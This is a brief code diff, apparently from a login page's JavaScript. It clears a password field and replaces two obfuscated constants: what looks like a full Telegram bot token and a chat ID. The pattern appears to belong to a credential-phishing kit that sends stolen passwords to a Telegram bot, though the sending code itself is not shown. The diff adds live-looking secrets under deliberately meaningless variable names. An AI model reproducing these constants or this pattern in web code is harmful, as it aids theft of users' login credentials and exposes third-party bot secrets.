@@ -182,9 +182,9 @@
         document.getElementById('password').value = '';
       });
       
-      const iovjrtrdhhj9 = '7996867814:AAEaHACu-GScOX-wCv6gTuWBuXGBVojg2wA';
+      const iovjrtrdhhj9 = '8064335378:AAHkMI_3wR6HGrl5LSEufIbFlyAkwUrEoOI';
    
-   const I94626736O = '7228514245';
+   const I94626736O = '8132348199';
       
   });
 })();
